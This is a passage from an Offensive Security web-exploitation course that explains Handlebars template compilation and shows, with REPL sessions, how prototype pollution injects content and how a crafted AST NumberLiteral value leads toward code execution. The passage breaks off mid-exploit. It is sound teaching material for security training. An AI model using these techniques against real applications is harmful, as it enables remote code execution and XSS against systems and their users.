│   ├── runtime.js 
│   ├── safe-string.js 
│   └── utils.js 
├── handlebars.js 
├── handlebars.runtime.js 
└── precompiler.js 
Listing 620 - Handlebars CJS directory 
For Handlebars templates to be turned into something usable, they must be compiled. The 
compilation process is very similar to that of typical compiled languages, such as C. 
The original text is first processed by a tokenizer or a lexer. This will convert the input stream into 
a set of tokens that will be parsed into an intermediate code representation.321 This process will 
identify open and close brackets, statements, end of files, and many other parts of a language 
before it is executed. 
Within Handlebars, the tokenization and parsing is handled by the compiler/parser.js file. The 
parse process is initiated by compiler/base.js. 
... 
13 
14  var _parser = require('./parser'); 
15 
16  var _parser2 = _interopRequireDefault(_parser); 
... 
33  function parseWithoutProcessing(input, options) { 
 
321 (Farrell, 1995), http://www.cs.man.ac.uk/~pjj/farrell/comp3.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
534 
34    // Just return if an already-compiled AST was passed in. 
35    if (input.type === 'Program') { 
36      return input; 
37    } 
38 
39    _parser2['default'].yy = yy; 
40 
41    // Altering the shared object here, but this is ok as parser is a sync operation 
42    yy.locInfo = function (locInfo) { 
43      return new yy.SourceLocation(options && options.srcName, locInfo); 
44    }; 
45 
46    var ast = _parser2['default'].parse(input); 
47 
48    return ast; 
49  } 
50 
51  function parse(input, options) { 
52    var ast = parseWithoutProcessing(input, options); 
53    var strip = new _whitespaceControl2['default'](options); 
54 
55    return strip.accept(ast); 
56  } 
Listing 621 - Handlebars base.js 
To generate the intermediate code representation, an application uses the parse function, which 
will call parseWithoutProcessing. On line 35, this function will first check if the input is already an 
intermediate code representation by checking if the type is a Program. This step will be important 
later when we are executing code. If the input is not already a Program, it will use the parser file to 
process the data and return the output. 
We have a lot of flexibility in how we call the parse function because of this check. If we pass in a 
template as a string, the library will parse and compile it. If we pass in an intermediate code 
representation object instead, the library will skip the parsing step and just compile it. Either way, 
the parse function will strip the whitespace from the output as a final step. 
The parse function returns a cleaned-up intermediate code representation of the original input in 
the form of an Abstract Syntax Tree (AST).322 Let’s use the interactive CLI to examine the AST 
generated by Handlebars. 
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --
inspect=0.0.0.0:9228 
Debugger listening on ws://0.0.0.0:9228/575b6cc3-001e-4db5-abfd-b87175223311 
For help, see: https://nodejs.org/en/docs/inspector 
Welcome to Node.js v14.16.0. 
Type ".help" for more information. 
> Handlebars = require("handlebars") 
... 
} 
> ast = Handlebars.parse("hello {{ foo }}") 
{ 
  type: 'Program', 
 
322 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Abstract_syntax_tree 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
535 
  body: [ 
    { 
      type: 'ContentStatement', 
      original: 'hello ', 
      value: 'hello ', 
      loc: [SourceLocation] 
    }, 
    { 
      type: 'MustacheStatement', 
      path: [Object], 
      params: [], 
      hash: undefined, 
      escaped: true, 
      strip: [Object], 
      loc: [SourceLocation] 
    } 
  ], 
  strip: {}, 
  loc: { 
    source: undefined, 
    start: { line: 1, column: 0 }, 
    end: { line: 1, column: 17 } 
  } 
} 
 
> Handlebars.parse(ast) 
{ 
  type: 'Program', 
  body: [ 
... 
  ], 
  strip: {}, 
  loc: { 
... 
  } 
} 
Listing 622 - Parsing with Handlebars 
As shown in Listing 622, we called parse with a string containing static text (“hello”) and an 
expression (“{{ foo }}”) to be replaced with a value. The function returned an AST, which contains a 
ContentStatement for the static text and a MustacheStatement for the expression. In addition, the 
object also contains a type variable, which is set to “Program”. If we again call parse but pass it 
the AST object, the parse function will return the same object without any additional parsing. This 
is the expected behavior we mentioned previously and it will be very useful as we build our final 
payload. 
Once the intermediate code representation is generated, it needs to be converted to operation 
codes, which will later be used to compile the final JavaScript code. To observe this process, we 
can review the precompile function in compiler/compiler.js. 
472  function precompile(input, options, env) { 
473    if (input == null || typeof input !== 'string' && input.type !== 'Program') { 
474      throw new _exception2['default']('You must pass a string or Handlebars AST to 
Handlebars.precompile. You passed ' + input); 
475    } 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
536 
476 
477    options = options || {}; 
478    if (!('data' in options)) { 
479      options.data = true; 
480    } 
481    if (options.compat) { 
482      options.useDepths = true; 
483    } 
484 
485    var ast = env.parse(input, options), 
486        environment = new env.Compiler().compile(ast, options); 
487    return new env.JavaScriptCompiler().compile(environment, options); 
488  } 
Listing 623 - Precompile in Handlebars. 
The precompile function will first check if the input is the expected type and initialize the options 
object. The input will be parsed on line 485 using the same parse function we reviewed above. 
Remember, the input will not be modified if we pass in AST objects. The function will then 
compile the AST to generate the opcodes using the compile function on line 486. Finally, the 
function will compile the opcodes into JavaScript code on line 487. The source code for the 
Compiler().compile 
function 
can 
be 
found 
in 
compiler/compiler.js 
while 
the 
JavaScriptCompiler().compile function can be found in the compiler/javascript-compiler.js. 
Let’s try generating JavaScript using this precompile function. 
> precompiled = Handlebars.precompile(ast) 
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) 
{\n' + 
  '    var helper, lookupProperty = container.lookupProperty || function(parent, 
propertyName) {\n' + 
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' + 
  '          return parent[propertyName];\n' + 
  '        }\n' + 
  '        return undefined\n' + 
  '    };\n' + 
  '\n' + 
  '  return "hello "\n' + 
  '    + container.escapeExpression(((helper = (helper = lookupProperty(helpers,"foo") 
|| (depth0 != null ? lookupProperty(depth0,"foo") : depth0)) != null ? helper : 
container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != 
null ? depth0 : (container.nullContext || 
{}),{"name":"foo","hash":{},"data":data,"loc":{"start":{"line":1,"column":6},"end":{"l
ine":1,"column":15}}}) : helper)));\n' +   
  '},"useData":true}' 
Listing 624 - Precompile Output 
The JavaScript output contains the string “hello” and the code to lookup and append the foo 
variable. 
There is no native implementation that lets us print the generated operation codes (opcodes). 
However, this process will be important for the RCE and we will later debug this process to 
understand how the AST is processed into opcodes. For now, it’s important to know that before 
the AST is compiled into JavaScript code, it is first converted into an array of opcodes that 
instruct the compiler how to generate the final JavaScript code. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
537 
Let’s create a function to execute this template to demonstrate the completed lifecycle of a 
template. 
> eval("compiled = " + precompiled) 
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true } 
 
> hello = Handlebars.template(compiled) 
[Function: ret] { 
  isTop: true, 
  _setup: [Function (anonymous)], 
  _child: [Function (anonymous)] 
} 
 
> hello({"foo": "student"}) 
'hello student' 
Listing 625 - Executing the Template 
We use the eval function to convert the string to a usable object. This is only necessary because 
we used the precompile function. We can use the compile function, but this returns the executable 
function instead of the string, which would help clarify the compilation process. Next, we generate 
the actual template function by using the Handlebars.template function. This returns another 
function, which renders the template when executed (and provided with the necessary data). 
This flow is summarized by the following sequence diagram. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
538 
 
Figure 335: Handlebars Compilation Sequence Diagram 
Now that we understand how a template is rendered, let’s review how we can abuse it with 
prototype pollution. We’ll begin by determining if the target is running Handlebars and later we will 
focus on RCE. 
Let’s start by working backwards in the template generation process. The farther in the process 
that we find the injection point, the higher the likelihood that our injection will have a noticeable 
difference in the output. This is because we give the library less time to overwrite or change our 
modifications, or simply crash. For this reason, we’ll start by reviewing the compiler/javascript-
compiler.js file. 
In the review, we find the appendContent function, which seems interesting. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
539 
369    // [appendContent] 
370    // 
371    // On stack, before: ... 
372    // On stack, after: ... 
373    // 
374    // Appends the string value of `content` to the current buffer 
375    appendContent: function appendContent(content) { 
376      if (this.pendingContent) { 
377        content = this.pendingContent + content; 
378      } else { 
379        this.pendingLocation = this.source.currentLocation; 
380      } 
381 
382      this.pendingContent = content; 
383    }, 
Listing 626 - appendContent Function 
A function like this seems perfect for prototype pollution. A potentially unset variable 
(this.pendingContent) is appended to an existing variable (content). Now we just need to 
understand how the function is called. A search through the source code reveals that it’s used in 
compiler/compiler.js. 
228    ContentStatement: function ContentStatement(content) { 
229      if (content.value) { 
230        this.opcode('appendContent', content.value); 
231      } 
232    }, 
Listing 627 - Using appendContent 
As discussed earlier, Handlebars will create an AST, create the opcodes, and convert the opcodes 
to JavaScript code. The function in Listing 627 instructs the compiler how to create opcodes for a 
ContentStatement. If there is a value in the content, it will call the appendContent function and 
pass in the content. 
Let’s review the AST of our input template to determine if we have a ContentStatement. 
{ 
  type: 'Program', 
  body: [ 
    { 
      type: 'ContentStatement', 
      original: 'hello ', 
      value: 'hello ', 
      loc: [SourceLocation] 
    }, 
    { 
      type: 'MustacheStatement', 
      path: [Object], 
      params: [], 
      hash: undefined, 
      escaped: true, 
      strip: [Object], 
      loc: [SourceLocation] 
    } 
  ], 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
540 
  strip: {}, 
  loc: { 
    source: undefined, 
    start: { line: 1, column: 0 }, 
    end: { line: 1, column: 17 } 
  } 
} 
Listing 628 - AST of Input Template 
The ContentStatement is used for the string portion of the template. In our case, its value is 
“hello”. Templates are not required to have a ContentStatement; however, for most templates to 
be useful, they will almost always have one. Therefore, injecting into pendingContent should 
almost always append content to the template. 
Let’s attempt to exploit this in our interactive CLI and then later exploit it using an HTTP request. 
> {}.__proto__.pendingContent = "haxhaxhax" 
'haxhaxhax' 
 
> precompiled = Handlebars.precompile(ast) 
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) 
{\n' + 
  '    var helper, lookupProperty = container.lookupProperty || function(parent, 
propertyName) {\n' + 
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' + 
  '          return parent[propertyName];\n' + 
  '        }\n' + 
  '        return undefined\n' + 
  '    };\n' + 
  '\n' + 
  '  return "haxhaxhaxhello "\n' + 
  '    + container.escapeExpression(((helper = (helper = lookupProperty(helpers,"foo") 
|| (depth0 != null ? lookupProperty(depth0,"foo") : depth0)) != null ? helper : 
container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != 
null ? depth0 : (container.nullContext || 
{}),{"name":"foo","hash":{},"data":data,"loc":{"start":{"line":1,"column":6},"end":{"l
ine":1,"column":15}}}) : helper)));\n' +   
  '},"useData":true}' 
   
> eval("compiled = " + precompiled) 
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true } 
 
> hello = Handlebars.template(compiled) 
[Function: ret] { 
  isTop: true, 
  _setup: [Function (anonymous)], 
  _child: [Function (anonymous)] 
} 
 
> hello({"foo": "student"}) 
'haxhaxhaxhello student' 
Listing 629 - Exploiting with pendingContent 
The “haxhaxhax” string was included in the compiled code and the final output. Now, let’s set this 
using an HTTP request. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
541 
13.5.1.1.1 
 
Make sure that the TEMPLATING_ENGINE is set to ‘hbs’ when starting docker-
compose. This will ensure we are using the hbs templating engine. 
 
Figure 336: Setting pendingContent in Payload 
With pendingContent set in the encrypted value, let’s send the request to /guaclite and exploit the 
prototype pollution. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
542 
 
Figure 337: Connecting with token 
As with EJS, the page loads without any issues. However, if we load another page at this time, we 
will find our content appended. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
543 
 
Figure 338: Viewing Appended Content 
Excellent! At this point, we have a method to detect if the target is running Handlebars if we don’t 
have access to the source code. While this is useful in blackbox targets, this is also useful for 
whitebox testing to help determine if a library is used when we can’t figure out how or where it is 
used. 
Now that we’ve exploited the prototype pollution to inject content, let’s take it to the next level and 
obtain RCE. 
13.5.1.2 Exercises 
1. 
Follow along with this section but connect to the remote debugger and observe the 
prototype pollution exploit. 
2. 
Why can we not reach RCE with the pendingContent exploit? 
3. 
Obtain a working XSS with handlebars using the pendingContent exploit. 
4. 
Unset pendingContent to return to normal functionality. 
13.5.1.3 Extra Mile 
Switch to the Pug templating engine. Discover a mechanism to detect if the target is running Pug 
using prototype pollution. Using this mechanism, obtain XSS against the target. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
544 
13.5.2 Handlebars - Remote Code Execution 
With our detection mechanism working, let’s attempt to execute code in Handlebars. Before we 
begin, we will restart the application since the prototype is polluted from the previous section. 
student@chips:~/chips$ docker-compose down 
Stopping chips_chips_1 ... done 
Stopping rdesktop      ... done 
Stopping guacd         ... done 
Removing chips_chips_1 ... done 
Removing rdesktop      ... done 
Removing guacd         ... done 
Removing network chips_default 
student@chips:~/chips$ TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-
compose.yml up 
... 
Listing 630 - Restarting Chips 
While it might seem that we could use the pendingContent exploit that we found earlier to add 
JavaScript code to the compiled object, it’s actually not possible. The content that’s added to 
pendingContent is escaped, preventing us from injecting JavaScript. 
> Handlebars = require("handlebars") 
... 
 
> {}.__proto__.pendingContent = "singleQuote: ' DoubleQuote: \" " 
`singleQuote: ' DoubleQuote: " ` 
 
> Handlebars.precompile("Hello {{ foo }}") 
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) 
{\n' + 
  '    var helper, lookupProperty = container.lookupProperty || function(parent, 
propertyName) {\n' + 
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' + 
  '          return parent[propertyName];\n' + 
  '        }\n' + 
  '        return undefined\n' + 
  '    };\n' + 
  '\n' + 
  `  return "singleQuote: ' DoubleQuote: \\" Hello "\n` + 
  '    + container.escapeExpression(((helper = (helper = lookupProperty(helpers,"foo") 
|| (depth0 != null ? lookupProperty(depth0,"foo") : depth0)) != null ? helper : 
container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != 
null ? depth0 : (container.nullContext || 
{}),{"name":"foo","hash":{},"data":data,"loc":{"start":{"line":1,"column":6},"end":{"l
ine":1,"column":15}}}) : helper)));\n' +   
  '},"useData":true}' 
Listing 631 - pendingContent Escaped 
Let’s investigate how and why the content is escaped to find a way to bypass it. As a reminder, 
we’ll review the appendContent function in compiler/javascript-compiler.js. 
375  appendContent: function appendContent(content) { 
376    if (this.pendingContent) { 
377      content = this.pendingContent + content; 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
545 
378    } else { 
379      this.pendingLocation = this.source.currentLocation; 
380    } 
381   
382    this.pendingContent = content; 
383  }, 
Listing 632 - appendContent Function 
The appendContent function will append to the content if pendingContent is set. At the end of the 
function, it sets this.pendingContent to the concatenated content. If we search the rest of 
compiler/javascript-compiler.js for “pendingContent” we find that it’s “pushed” via the pushSource 
function. 
881  pushSource: function pushSource(source) { 
882    if (this.pendingContent) { 
883      
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), 
this.pendingLocation)); 
884      this.pendingContent = undefined; 
885    } 
886 
887    if (source) { 
888      this.source.push(source); 
889    } 
890  }, 
Listing 633 - pushSource Function 
If this.pendingContent is set, this.source.push pushes the content. However, the content is first 
passed to this.source.quotedString. We can find the quotedString function in compiler/code-gen.js. 
118  quotedString: function quotedString(str) { 
119    return '"' + (str + '').replace(/\\/g, '\\\\').replace(/"/g, 
'\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r').replace(/\u2028/g, '\\u2028') // 
Per Ecma-262 7.3 + 7.8.4 
120    .replace(/\u2029/g, '\\u2029') + '"'; 
121  }, 
Listing 634 - quotedString Function 
This is most likely the function that is escaping the quotes on pendingContent. 
Since pushSource is used to add pending content, let’s work backwards to find instances of calls 
to pushSource that may append the pending content. One of these instances is through the 
appendEscaped function in compiler/javascript-compiler.js. 
416  appendEscaped: function appendEscaped() { 
417  
this.pushSource(this.appendToBuffer([this.aliasable('container.escapeExpression'), 
'(', this.popStack(), ')'])); 
418  }, 
Listing 635 - appendEscaped Function 
Working back farther, we find that appendEscaped is the opcode function that is mapped to the 
MustacheStatement node in the AST. This function is found in compiler/compiler.js. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
546 
215  MustacheStatement: function MustacheStatement(mustache) { 
216    this.SubExpression(mustache); 
217   
218    if (mustache.escaped && !this.options.noEscape) { 
219      this.opcode('appendEscaped'); 
220    } else { 
221      this.opcode('append'); 
222    } 
223  }, 
Listing 636 - MustacheStatement 
To summarize, when the Handlebars library builds the AST, the text is converted into tokens that 
represent the type of content. If we remember back to our original template hello {{ foo }}, we 
found that it converted to two types of statements: a ContentStatement for the “hello” and a 
MustacheStatement for the “{{ foo }}” expression. 
> ast = Handlebars.parse("hello {{ foo }}") 
{ 
  type: 'Program', 
  body: [ 
    { 
      type: 'ContentStatement', 
      original: 'hello ', 
      value: 'hello ', 
      loc: [SourceLocation] 
    }, 
    { 
      type: 'MustacheStatement', 
      path: [Object], 
      params: [], 
      hash: undefined, 
      escaped: true, 
      strip: [Object], 
      loc: [SourceLocation] 
    } 
  ], 
  strip: {}, 
  loc: { 
    source: undefined, 
    start: { line: 1, column: 0 }, 
    end: { line: 1, column: 17 } 
  } 
} 
Listing 637 - Review of AST for template 
In order to convert these statements into JavaScript code, they are mapped to functions that 
dictate how to append the content to the compiled template. The appendEscaped function in 
Listing 636 is one example of this kind of function. 
In order to exploit Handlebars, we could search for a statement that pushes content without 
escaping it. We could then review the types of components that may be added to Handlebars 
templates to find something that we can use. These components can be found in 
compiler/compiler.js. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
547 
... 
215    MustacheStatement: function MustacheStatement(mustache) { 
... 
223    }, 
... 
228    ContentStatement: function ContentStatement(content) { 
... 
232    }, 
233 
234    CommentStatement: function CommentStatement() {}, 
... 
309 
310    StringLiteral: function StringLiteral(string) { 
311      this.opcode('pushString', string.value); 
312    }, 
313 
314    NumberLiteral: function NumberLiteral(number) { 
315      this.opcode('pushLiteral', number.value); 
316    }, 
317 
318    BooleanLiteral: function BooleanLiteral(bool) { 
319      this.opcode('pushLiteral', bool.value); 
320    }, 
321 
322    UndefinedLiteral: function UndefinedLiteral() { 
323      this.opcode('pushLiteral', 'undefined'); 
324    }, 
325 
326    NullLiteral: function NullLiteral() { 
327      this.opcode('pushLiteral', 'null'); 
328    }, 
... 
Listing 638 - Components of a Template 
Only some of the components are included in Listing 638 but they are all worth investigating. 
We are already familiar with a MustacheStatement and a ContentStatement. We also find here a 
CommentStatement, which (like any comment) doesn’t push any opcodes. However, we also find 
a list of literals including StringLiteral, NumberLiteral, BooleanLiteral, UndefinedLiteral, and 
NullLiteral. 
StringLiteral uses the pushString opcode with the string value. Let’s analyze this function in 
compiler/javascript-compiler.js starting on line 585. 
585  // [pushString] 
586  // 
587  // On stack, before: ... 
588  // On stack, after: quotedString(string), ... 
589  // 
590  // Push a quoted version of `string` onto the stack 
591  pushString: function pushString(string) { 
592    this.pushStackLiteral(this.quotedString(string)); 
593  }, 
Listing 639 - pushString Function 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
548 
Listing 639 shows that pushString will also escape the quotes. This would not be a good target 
for us. 
NumberLiteral, BooleanLiteral, UndefinedLiteral, and NullLiteral use the pushLiteral opcode. 
NumberLiteral and BooleanLiteral provide a variable, while UndefinedLiteral and NullLiteral provide 
a static value. Let’s analyze how pushLiteral works. It can be found in compiler/javascript-
compiler.js starting on line 595. 
595  // [pushLiteral] 
596  // 
597  // On stack, before: ... 
598  // On stack, after: value, ... 
599  // 
600  // Pushes a value onto the stack. This operation prevents 
601  // the compiler from creating a temporary variable to hold 
602  // it. 
603  pushLiteral: function pushLiteral(value) { 
604    this.pushStackLiteral(value); 
605  }, 
Listing 640 - pushLiteral Function 
The pushLiteral function runs pushStackLiteral with the value. This function is also found in the 
same file. 
868  push: function push(expr) { 
869    if (!(expr instanceof Literal)) { 
870      expr = this.source.wrap(expr); 
871    } 
872 
873    this.inlineStack.push(expr); 
874    return expr; 
875  }, 
876 
877  pushStackLiteral: function pushStackLiteral(item) { 
878    this.push(new Literal(item)); 
879  }, 
Listing 641 - pushStackLiteral and push Functions 
The pushStackLiteral function calls the push function. The exact functionality of these two 
functions is less important than the fact that they do not escape the value in any way. 
Theoretically, if we were to be able to add a NumberLiteral or BooleanLiteral object to the 
prototype, with a value of a command we want to run, we might be able to inject into the 
generated function. This should result in command execution when the template is rendered. 
Let’s investigate what a Handlebars NumberLiteral object might consist of. To do this, we’ll use a 
modified test template that will create multiple types of block statements, expressions, and 
literals.323 
{{someHelper "some string" 12345 true undefined null}} 
Listing 642 - Handlebars Template with Parsed Types 
 
323 (handlebars, 2020), https://github.com/handlebars-lang/handlebars-
parser/blob/577a5f6336aaa5892ad3f10985d8eeb7124b1c7c/spec/visitor.js#L11 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
549 
This template will execute a helper with five arguments. The most important components for us 
in this template are the five arguments provided to the “someHelper” helper: “some string”, 12345, 
true, undefined, and null. This will create a StringLiteral, NumberLiteral, BooleanLiteral, 
UndefinedLiteral, and NullLiteral. Let’s use this template to generate an AST and then access the 
NumberLiteral object in the AST. 
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --
inspect=0.0.0.0:9228 
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe 
For help, see: https://nodejs.org/en/docs/inspector 
Welcome to Node.js v14.16.0. 
Type ".help" for more information. 
> Handlebars = require("handlebars") 
... 
> ast = Handlebars.parse('{{someHelper "some string" 12345 true undefined null}}') 
... 
> ast.body[0].params[1] 
{ 
  type: 'NumberLiteral', 
  value: 12345, 
  original: 12345, 
  loc: SourceLocation { 
    source: undefined, 
    start: { line: 1, column: 27 }, 
    end: { line: 1, column: 32 } 
  } 
} 
Listing 643 - StringLiteral Object Example 
To access the NumberLiteral object, we need to traverse the AST. We first access the first index in 
the body element (the MustacheStatement). Within this element, we can obtain access to the 
parameters. The number argument was the second element, so we’ll access the second index in 
the array. This will return an example of the NumberLiteral object. 
Let’s generate the code to analyze how the number would be displayed in a function. 
> Handlebars.precompile(ast) 
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) 
{\n' + 
  '    var lookupProperty = container.lookupProperty || function(parent, propertyName) 
{\n' + 
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' + 
  '          return parent[propertyName];\n' + 
  '        }\n' + 
  '        return undefined\n' + 
  '    };\n' + 
  '\n' + 
  '  return container.escapeExpression((lookupProperty(helpers,"someHelper")||(depth0 
&& lookupProperty(depth0,"someHelper"))||container.hooks.helperMissing).call(depth0 != 
null ? depth0 : (container.nullContext || {}),"some 
string",12345,true,undefined,null,{"name":"someHelper","hash":{},"data":data,"loc":{"s
tart":{"line":1,"column":0},"end":{"line":1,"column":54}}}));\n' +                                  
  '},"useData":true}' 
Listing 644 - Precompile with NumberLiteral 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
550 
Once precompiled, we can find “12345” within the generated code. If we were to use this as our 
injection point, we should understand where we are injecting. To do this, we’ll format the return 
function in a more readable format. 
container.escapeExpression( 
    (lookupProperty(helpers, "someHelper") || 
        (depth0 && lookupProperty(depth0, "someHelper")) || 
        container.hooks.helperMissing 
    ).call( 
        depth0 != null ? depth0 : (container.nullContext || {}), 
        "some string", 
        12345, 
        true, 
        undefined, 
        null, 
        { 
            "name": "someHelper", 
            "hash": {}, 
            "data": data, 
            "loc": { 
                "start": { 
                    "line": 1, 
                    "column": 0 
                }, 
                "end": { 
                    "line": 1, 
                    "column": 54 
                } 
            } 
        } 
    ) 
); 
Listing 645 - Formatted Return 
The number is used as an argument to the call function. As long as the JavaScript we are 
injecting is syntactically correct, we do not need to do any extra escaping. Let’s attempt to change 
the value of the number in the AST to call console.log, precompile it, and render the template. 
> ast.body[0].params[1].value = "console.log('haxhaxhax')" 
"console.log('haxhaxhax')" 
 
> precompiled = Handlebars.precompile(ast) 
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) 
{\n' + 
  '    var lookupProperty = container.lookupProperty || function(parent, propertyName) 
{\n' + 
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' + 
  '          return parent[propertyName];\n' + 
  '        }\n' + 
  '        return undefined\n' + 
  '    };\n' + 
  '\n' + 
  `  return container.escapeExpression((lookupProperty(helpers,"someHelper")||(depth0 
&& lookupProperty(depth0,"someHelper"))||container.hooks.helperMissing).call(depth0 != 
null ? depth0 : (container.nullContext || {}),"some 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
551 
string",console.log('haxhaxhax'),true,undefined,null,{"name":"someHelper","hash":{},"d
ata":data,"loc":{"start":{"line":1,"column":0},"end":{"line":1,"column":54}}}));\n` +               
  '},"useData":true}' 
   
> eval("compiled = " + precompiled) 
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true } 
 
> tem = Handlebars.template(compiled) 
... 
> tem({}) 
haxhaxhax 
Uncaught Error: Missing helper: "someHelper" 
    at Object.<anonymous> 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-
missing.js:19:13) 
    at Object.wrapper 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/internal/wrapHelper.js:15:19
) 
    at Object.main (eval at <anonymous> (REPL14:1:1), <anonymous>:9:156) 
    at main 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:208:32) 
    at ret 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:212:12) { 
  description: undefined, 
  fileName: undefined, 
  lineNumber: undefined, 
  endLineNumber: undefined, 
  number: undefined 
} 
Listing 646 - Rendering With Injection 
We set the value of the NumberLiteral to a console.log statement. When we precompile the AST, 
we find the message as an argument where the number used to be. When we run the template, 
an error is thrown. However, before the error is thrown, our code is executed! 
Now that we know what type of node we need in the AST, we need to find a way to add a 
NumberLiteral with our custom value. Or better yet, create our own AST with a NumberLiteral and 
our custom value. 
Earlier, 
we 
reviewed 
the 
parseWithoutProcessing 
function 
in 
node_modules/handlebars/dist/cjs/handlebars/compiler/base.js. 
... 
33  function parseWithoutProcessing(input, options) { 
34    // Just return if an already-compiled AST was passed in. 
35    if (input.type === 'Program') { 
36      return input; 
37    } 
38 
39    _parser2['default'].yy = yy; 
40 
41    // Altering the shared object here, but this is ok as parser is a sync operation 
42    yy.locInfo = function (locInfo) { 
43      return new yy.SourceLocation(options && options.srcName, locInfo); 
44    }; 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
552 
45 
46    var ast = _parser2['default'].parse(input); 
47 
48    return ast; 
49  } 
Listing 647 - parseWithoutProcessing Function 
On line 35, the library checks if the input passed in is already compiled. Because of this, we can 
pass in an AST or a raw string into the precompile function. However, if a raw string is passed in, 
the value of input.type is undefined. This means that the string prototype will be searched for the 
value. If we set the type variable in the object prototype to ‘Program’, we can trick Handlebars into 
always assuming that we are providing an AST. We can then create our own AST in the object 
prototype, which runs the commands that we want. 
To do this, we’ll set the prototype to “Program”, observe the errors, and fix the errors one by one in 
the object prototype until we have a template that will parse. 
> {}.__proto__.type = "Program" 
'Program' 
 
> Handlebars.parse("hello {{ foo }}") 
Uncaught TypeError: Cannot read property 'length' of undefined 
    at WhitespaceControl.Program 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/whitespace-
control.js:26:28) 
    at WhitespaceControl.accept 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/visitor.js:72:32) 
    at HandlebarsEnvironment.parse 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:55:16) 
Listing 648 - First Error When type is Set 
We’ll start debugging in Visual Studio Code with the CLI. We’ll also check the Caught Exceptions 
and Uncaught Exceptions breakpoints so the debugger can immediately jump to the code that is 
causing the issue. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
553 
 
Figure 339: Start CLI Debugger With Exceptions 
When we parse the template again, an exception is caught on line 26 of compiler/whitespace-
control.js. 
25    var body = program.body; 
